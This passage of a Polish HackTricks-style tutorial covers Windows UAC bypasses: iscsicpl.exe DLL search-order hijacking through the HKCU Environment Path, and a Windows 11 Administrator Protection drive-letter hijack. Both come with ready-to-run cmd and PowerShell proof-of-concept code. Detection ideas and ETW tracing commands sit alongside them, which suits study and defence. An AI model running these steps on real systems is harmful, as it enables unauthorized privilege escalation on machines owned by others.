- Mechanizm ten łączy **auto-elevation** z **DLL search-order hijacking**, dlatego ten sam przepływ pracy w ProcMon, który stosuje się do innych UAC bypass, jest przydatny do potwierdzenia braku ładowania biblioteki DLL.

Minimalny przebieg:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Pomysły dotyczące wykrywania:
- Generuj alerty dla `reg add` / zapisów do rejestru w `HKCU\Environment\Path`, po których bezpośrednio następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
- Wyszukuj `iscsiexe.dll` w lokalizacjach **kontrolowanych przez użytkownika**, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem bibliotek DLL spoza standardowych katalogów Windows.

### Nowsze badania, które warto sprawdzić osobno

Niektóre chainy opublikowane po 2024 roku nie przypominają już klasycznych hijacków rejestru `HKCU\Software\Classes`. Przykładowo, poisoning activation-context cache może łączyć **drive remap** i **DLL redirection**, aby przejść ze średniego poziomu integralności do wysokiego za pośrednictwem zaufanych interfejsów użytkownika / binariów z automatyczną eskalacją uprawnień, takich jak `ctfmon.exe`, a następnie nowszych celów, takich jak `fodhelper.exe`. Zamiast powielać tutaj duży PoC, sprawdź zwięzłe przykłady payloadów w:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) drive-letter hijack za pośrednictwem mapy urządzeń DOS dla poszczególnych sesji logowania

> [!NOTE]
> Według stanu na sierpień 2026 roku Microsoft nadal opisuje Administrator Protection jako **wersję Insider preview**: wdrożenie z października 2025 roku zostało wycofane i jest planowane na późniejszy termin. Przed testowaniem tych chainów potwierdź, że funkcja **Admin Approval Mode with Administrator protection** jest faktycznie włączona oraz że urządzenie zostało uruchomione ponownie; sam ciąg wersji 25H2 nie dowodzi aktywności tej funkcji.<sup>[[10]](#references)</sup>

Pełny opis powierzchni ataku `RAiLaunchAdminProcess` / UIAccess w wersjach preview Windows 11 25H2 znajdziesz na dedykowanej stronie:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection” używa tokenów shadow-admin z mapami `\Sessions\0\DosDevices/<LUID>` dla poszczególnych sesji. Katalog jest tworzony leniwie przez `SeGetTokenDeviceMap` przy pierwszym rozwiązywaniu `\??`. Jeśli attacker impersonuje token shadow-admin tylko na poziomie **SecurityIdentification**, katalog zostaje utworzony z attackerem jako **ownerem** (dziedziczy `CREATOR OWNER`), co umożliwia tworzenie linków liter dysków mających pierwszeństwo przed `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Kroki:**

1. Z sesji z niskimi uprawnieniami wywołaj `RAiProcessRunOnce`, aby uruchomić pozbawiony promptu `runonce.exe` z uprawnieniami shadow-admin.
2. Zduplikuj jego główny token do tokena typu **identification** i impersonuj go podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z własnością attackera.
3. Utwórz tam dowiązanie symboliczne `C:` wskazujące na storage kontrolowany przez attackera; kolejne operacje systemu plików w tej sesji będą rozwiązywać `C:` do ścieżki attackera, umożliwiając DLL/file hijack bez wyświetlania promptu.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Na hostach preview funkcja Administrator Protection rejestruje zatwierdzenia i niepowodzenia jako zdarzenia ETW **15031** i **15032** w ramach providera `Microsoft-Windows-LUA`. Zdarzenia zawierają SID żądającego, ścieżkę aplikacji, wynik, zarządzane konto administratora oraz metodę uwierzytelniania, dlatego powtarzające się próby exploitów lub nieudane sterowanie interfejsem użytkownika nie pozostają bez telemetrii.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jak działa User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcja technik bypass UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skaner kompatybilności i launcher bypass UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI wykorzystuje AI do generowania PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: wykorzystanie 0-Day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omijanie Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC przy użyciu zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – bypasses UnifiedConsent, TabTip i Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Wywoływanie lokalnych serwerów Windows RPC z .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte rozszerza CoolClient o podpisany Windows Kernel Rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
